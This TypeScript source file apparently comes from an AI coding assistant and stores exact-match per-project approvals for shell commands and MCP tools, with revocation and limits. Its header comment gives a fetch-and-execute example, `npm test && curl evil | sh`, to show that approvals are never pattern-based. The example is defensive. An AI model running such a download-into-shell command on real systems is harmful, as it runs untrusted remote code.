/*--------------------------------------------------------------------------------------
 *  Vader addition. Licensed under the Apache License, Version 2.0. See LICENSE.txt.
 *--------------------------------------------------------------------------------------*/

// "Allow in this project": a command or an MCP tool the person approved once and wants to stop being asked about in that project.
//
// What it can and cannot do:
//  - It is exact. A command is remembered as the whole line (spaces collapsed), never as a pattern, so approving `npm test` does not approve
//    `npm test && curl evil | sh`. An MCP tool is remembered by server and tool name.
//  - It only replaces the ordinary "ask" of the permission mode. It is never consulted when the Policy Engine itself says "ask" (keys and
//    credentials, installs, sudo, force-push, a download piped into a shell...) and it cannot reach a "deny". See chatThreadService.ts's
//    _evaluateToolCallGate, which asks for it only when the policy has no objection.
//  - It belongs to one project (the folder key of threadProjects.ts) and can be revoked one by one in Settings > Permissions.

export type ApprovalSubject =
	| { readonly kind: 'command'; readonly command: string }
	| { readonly kind: 'mcp'; readonly server: string; readonly tool: string };

export type StoredApproval = { readonly kind: 'command' | 'mcp'; readonly label: string; readonly addedAt: number };
export type ProjectApprovalState = { readonly version: 1; readonly projects: { readonly [projectKey: string]: { readonly [approvalKey: string]: StoredApproval } | undefined } };

export const MAX_APPROVALS_PER_PROJECT = 200;
export const MAX_COMMAND_LENGTH = 2000;

/** the key a subject is remembered under, or null when it must never be remembered (empty, several lines, too long) */
export function approvalKeyOf(subject: ApprovalSubject): string | null {
	if (subject.kind === 'mcp') {
		const server = subject.server.trim();
		const tool = subject.tool.trim();
		return server && tool ? `mcp\u0000${server}\u0000${tool}` : null;
	}
	const command = subject.command.replace(/[ \t]+/g, ' ').trim();
	if (!command || command.length > MAX_COMMAND_LENGTH || /[\r\n]/.test(command)) return null;
	return `command\u0000${command}`;
}

export function labelOf(subject: ApprovalSubject): string {
	return subject.kind === 'mcp' ? `${subject.server}: ${subject.tool}` : subject.command.replace(/[ \t]+/g, ' ').trim();
}

export function parseApprovalState(raw: unknown): ProjectApprovalState {
	const out: { [project: string]: { [key: string]: StoredApproval } } = {};
	if (raw && typeof raw === 'object' && (raw as { version?: unknown }).version === 1) {
		const projects = (raw as { projects?: unknown }).projects;
		if (projects && typeof projects === 'object') {
			for (const [project, entries] of Object.entries(projects as Record<string, unknown>)) {
				if (!entries || typeof entries !== 'object') continue;
				const clean: { [key: string]: StoredApproval } = {};
				for (const [key, e] of Object.entries(entries as Record<string, unknown>)) {
					const v = e as Partial<StoredApproval> | null;
					if (v && (v.kind === 'command' || v.kind === 'mcp') && typeof v.label === 'string' && typeof v.addedAt === 'number' && key.startsWith(`${v.kind}\u0000`)) clean[key] = { kind: v.kind, label: v.label, addedAt: v.addedAt };
				}
				if (Object.keys(clean).length) out[project] = clean;
			}
		}
	}
	return { version: 1, projects: out };
}

export const EMPTY_APPROVAL_STATE: ProjectApprovalState = { version: 1, projects: {} };

export function isApproved(state: ProjectApprovalState, projectKey: string | null, subject: ApprovalSubject): boolean {
	if (!projectKey) return false;
	const key = approvalKeyOf(subject);
	return !!key && !!state.projects[projectKey]?.[key];
}

/** returns the new state, or null when the subject cannot be remembered or the project is full */
export function withApproval(state: ProjectApprovalState, projectKey: string | null, subject: ApprovalSubject, now: number): ProjectApprovalState | null {
	if (!projectKey) return null;
	const key = approvalKeyOf(subject);
	if (!key) return null;
	const existing = state.projects[projectKey] ?? {};
	if (existing[key]) return state;
	if (Object.keys(existing).length >= MAX_APPROVALS_PER_PROJECT) return null;
	return { version: 1, projects: { ...state.projects, [projectKey]: { ...existing, [key]: { kind: subject.kind, label: labelOf(subject), addedAt: now } } } };
}

export function withoutApproval(state: ProjectApprovalState, projectKey: string, approvalKey: string): ProjectApprovalState {
	const existing = state.projects[projectKey];
	if (!existing?.[approvalKey]) return state;
	const { [approvalKey]: _gone, ...rest } = existing;
	const projects = { ...state.projects };
	if (Object.keys(rest).length) projects[projectKey] = rest; else delete projects[projectKey];
	return { version: 1, projects };
}

export function listApprovals(state: ProjectApprovalState, projectKey: string | null): { key: string; kind: 'command' | 'mcp'; label: string; addedAt: number }[] {
	if (!projectKey) return [];
	return Object.entries(state.projects[projectKey] ?? {}).map(([key, v]) => ({ key, kind: v!.kind, label: v!.label, addedAt: v!.addedAt })).sort((a, b) => b.addedAt - a.addedAt);
}
